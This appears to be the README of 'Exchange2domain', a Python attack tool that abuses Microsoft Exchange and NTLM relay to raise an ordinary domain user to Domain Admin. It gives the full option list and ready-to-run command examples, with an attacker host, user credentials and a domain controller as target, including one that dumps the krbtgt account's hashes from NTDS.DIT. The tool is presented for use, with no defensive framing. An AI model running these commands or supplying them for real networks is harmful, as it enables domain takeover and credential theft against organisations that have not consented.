# Exchange2domain

[![Python 2.7](https://img.shields.io/badge/python-2.7-yellow.svg)](https://www.python.org/) 

All in One tools of [privexchange](https://github.com/dirkjanm/privexchange/) . You only need to open the web server port, so **no high privileges are required**.

Great writeup! [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/).

## Requirements
These tools require [impacket](https://github.com/SecureAuthCorp/impacket). You can install it from pip with `pip install impacket`.

## Usage
```
usage: Exchange2domain.py [-h] [-u USERNAME] [-d DOMAIN] [-p PASSWORD]
                          [--hashes HASHES] [--no-ssl]
                          [--exchange-port EXCHANGE_PORT] -ah ATTACKER_HOST
                          [-ap ATTACKER_PORT] -th TARGET_HOST
                          [-exec-method [{smbexec,wmiexec,mmcexec}]]
                          [--exchange-version EXCHANGE_VERSION]
                          [--attacker-page ATTACKER_PAGE]
                          [--just-dc-user USERNAME] [--debug]
                          HOSTNAME

Exchange your privileges for Domain Admin privs by abusing Exchange. Use me
with ntlmrelayx

positional arguments:
  HOSTNAME              Hostname/ip of the Exchange server

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --user USERNAME
                        username for authentication
  -d DOMAIN, --domain DOMAIN
                        domain the user is in (FQDN or NETBIOS domain name)
  -p PASSWORD, --password PASSWORD
                        Password for authentication, will prompt if not
                        specified and no NT:NTLM hashes are supplied
  --hashes HASHES       LM:NLTM hashes
  --no-ssl              Don't use HTTPS (connects on port 80)
  --exchange-port EXCHANGE_PORT
                        Alternative EWS port (default: 443 or 80)
  -ah ATTACKER_HOST, --attacker-host ATTACKER_HOST
                        Attacker hostname or IP
  -ap ATTACKER_PORT, --attacker-port ATTACKER_PORT
                        Port on which the relay attack runs (default: 80)
  -th TARGET_HOST, --target-host TARGET_HOST
                        Hostname or IP of the DC
  -exec-method [{smbexec,wmiexec,mmcexec}]
                        Remote exec method to use at target (only when using
                        -use-vss). Default: smbexec
  --exchange-version EXCHANGE_VERSION
                        Exchange version of the target (default: Exchange2013,
                        choices:Exchange2010,Exchange2010_SP1,Exchange2010_SP2
                        ,Exchange2013,Exchange2013_SP1,Exchange2016)
  --attacker-page ATTACKER_PAGE
                        Page to request on attacker server (default:
                        /privexchange/)
  --just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified.
                        Only available for DRSUAPI approach.
  --debug               Enable debug output
```

example:
```
python Exchange2domain.py -ah attackterip   -ap listenport -u user -p password -d domain.com -th DCip MailServerip 
```

![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190129132650.png)



If you only want to dump `krbtgt`, use `--just-dc-user`.

example:
```
python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip  --just-dc-user krbtgt MailServerip
```

## Update

Auto backup old SD for restore.

![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190621191722.png)